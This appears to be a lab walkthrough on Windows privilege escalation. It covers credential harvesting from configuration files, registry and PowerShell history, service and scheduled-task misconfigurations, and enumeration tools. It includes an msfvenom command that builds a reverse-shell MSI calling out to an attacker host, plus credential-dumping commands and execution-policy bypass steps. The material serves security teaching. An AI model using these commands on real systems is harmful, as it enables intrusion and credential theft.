# Windows Privilege Escalation

## Description

Learn the fundamentals of Windows privilege escalation techniques.
* Category: Walkthrough

## Windows Privilege Escalation

Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:
* Misconfigurations on Windows services or scheduled tasks
* Excessive privileges assigned to our account
* Vulnerable software
* Missing Windows security patches

Before jumping into the actual techniques, let's look at the different account types on a Windows system.

### Windows Users

Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:

| **Administrators** | These users have the most privileges. They can change any system configuration parameter and access any file in the system. |
| **Standard Users** | These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. |

Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group.

In addition to that, we will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:

| **SYSTEM/Localsystem** | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| **Local Service** | Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network. |
| **Network Service** | Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network. |

These accounts are created and managed by Windows, and we won't be able to use them as other regular accounts. Still, in some situations, we may gain their privileges due to exploiting specific services.

## Harvesting Passwords from Usual Spots

The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.

### Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
* `C:\Unattend.xml`
* `C:\Windows\Panther\Unattend.xml`
* `C:\Windows\Panther\Unattend\Unattend.xml`
* `C:\Windows\system32\sysprep.inf`
* `C:\Windows\system32\sysprep\sysprep.xml`

As part of these files, we might encounter credentials:

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands we have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

The command above will only work from `cmd.exe`, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, we'd have to replace `%userprofile%` with `$Env:userprofile`.

### Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command that lists saved credentials: `cmdkey /list`.

While we can't see the actual passwords, if we notice any credentials worth trying, we can use them with the `runas` command and the `/savecred` option: `runas /savecred /user:admin cmd.exe`.

### IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find `web.config` in one of the following locations:
* `C:\inetpub\wwwroot\web.config`
* `C:\Windows\Microsft.NET\Framework64\v4.0.30319\Config\web.config`

Here is a quick way to find database connection strings on the file: `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionStrings`.

### Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, we can search under the following registry key for ProxyPassword with the following command: `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions /f "Proxy" /s`.

**Note**: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

## Other Quick Wins

Privilege escalation is not always a challenge. Some misconfigurations can allow us to obtain higher privileged user access and, in some cases, even administrator access. It would help if we considered these to belong more to the realm of CTF events rather than scenarios we will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, we can always go back to these.

### Scheduled Tasks

Looking into scheduled tasks on the target system, we may see a scheduled task that either lost its binary or it's using a binary we can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, we can use a command like the following one: `schtasks /query /tn vulntask /fo list /v`

What matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`.

### AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. We can query these from the command line using the commands below.

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, we can generate a malicious `.msi` file using: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`.

As this is a reverse shell, we should also run the Metasploit Handler module configured accordingly. Once we have transferred the file we have created, we can run the installer with the command below and receive the reverse shell: `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`.

## Abusing Service Misconfigurations

### Windows Services

Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker.

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`.

A subkey exists for every service in the system. The associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. Only administrators can modify such registry entries by default.

### Insecure Permissions on Service Executables

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

### Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

### Insecure Service Permissions

We might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow us to modify the configuration of a service, we will be able to reconfigure the service. This will allow us to point to any executable we need and run it with any account we prefer, including SYSTEM itself.

## Abusing dangerous privileges

### Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command: `whoami /priv`.

From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest.

### SeBackup/SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques.

### SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable.

### SeImpersonate/SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when we think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user `ftp`. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's.

There are several reasons why using ftp's token is not the best idea:
* For the files to be served correctly, they would need to be accessible to the `ftp` user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user `ftp`. This adds complexity as we must manually configure specific permissions for each served file/directory.
* For the operating system, all files are accessed by user `ftp`, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it.
* If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the `ftp` user has access.

If, on the other hand, the FTP service's user has the **SeImpersonate** or **SeAssignPrimaryToken** privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf.

Now, if user Ann logs in to the FTP service and given that the `ftp` user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user `ftp` in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, we will find that the `LOCAL SERVICE` and `NETWORK SERVICE` accounts already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called `iis apppool\defaultapppool` for web applications.

To elevate privileges using such accounts, an attacker needs the following:
1. To spawn a process so that users can connect and authenticate to it for impersonation to occur.
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

## Abusing vulnerable software

### Unpatched software

Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. We can use the `wmic` tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish): `wmic product get name,version,vendor`.

The `wmic product` command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db, packet storm or plain old Google, amongst many others.

## Tools of the Trade

Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, automated tools can sometimes miss privilege escalation.

### WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file.

### PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

Reminder: To run PrivescCheck on the target system, we may need to bypass the execution policy restrictions. To achieve this, we can use the `Set-ExecutionPolicy` cmdlet as shown below.

```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

### WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require us to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, we may prefer to use WES-NG.

Once installed, and before using it, type the `wes.py --update` command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability we can use to elevate our privileges on the target system.

To use the script, we will need to run the `systeminfo` command on the target system and redirect its output to a file.

### Metasploit

If we already have a Meterpreter shell on the target system, we can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow us to elevate our privileges on the target system.